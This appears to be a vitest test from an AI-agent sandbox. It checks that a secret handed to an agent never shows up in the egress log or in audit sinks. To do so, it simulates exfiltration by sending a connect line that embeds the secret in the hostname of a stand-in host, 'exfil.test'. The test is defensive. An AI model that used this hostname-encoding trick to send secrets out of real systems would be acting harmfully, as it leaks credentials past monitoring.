import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { createFakeClock } from "../../kernel/clock.ts";
import { captureLogger } from "../../testing/capture-logger.ts";
import { createEgress, type Egress } from "../egress/index.ts";
import { connectLine, exchange, scopeOf } from "../egress/testing/bed.ts";
import { dumpOf, setup, VALUE } from "./testing/secret-requests-bed.ts";

let tmp: string;
let egress: Egress;
beforeEach(() => {
  tmp = mkdtempSync(join(tmpdir(), "sel-"));
});
afterEach(async () => {
  await egress.dropSession("s1");
  rmSync(tmp, { recursive: true, force: true });
});

describe("a secret an agent asked for never reaches the egress log (W5-R54)", () => {
  it("logs a host holding an answered one-use value as a hash, nowhere as the value", async () => {
    const s = await setup();
    const call = s.ask();
    await s.t.bed.clock.advance(0);
    s.secretRequests.answer(s.t.bed.owner(), { requestId: s.pendingId(), value: VALUE, mode: "once" });
    await call.promise;
    expect(s.once.size()).toBe(1);

    const logs = captureLogger();
    egress = createEgress({
      clock: createFakeClock(),
      logger: logs.logger,
      papHome: tmp,
      runtimeDir: undefined,
      probe: async () => ({ usable: true, python: "/usr/bin/python3.14", reason: null }),
    });
    await egress.bootClean();
    const opened = await egress.openCommand(scopeOf({ hosts: ["api.test"] }));
    if (!("socket" in opened)) throw new Error("not opened");
    await exchange(opened.socket, connectLine(`${VALUE}.exfil.test:443`));
    await egress.closeCommand("s1", opened.id);
    const line = logs.lines.find((entry) => entry["msg"] === "egress_command");
    expect(line?.["hosts"]).toEqual([expect.stringMatching(/^h:[0-9a-f]{12} \(len \d+\)$/)]);
    // The egress logger's lines and the secrets bed's own sinks (its logs, audit rows, warnings, requests): the value is in none.
    expect(JSON.stringify(logs.lines).toLowerCase()).not.toContain(VALUE);
    expect(dumpOf(s).toLowerCase()).not.toContain(VALUE);
  });
});
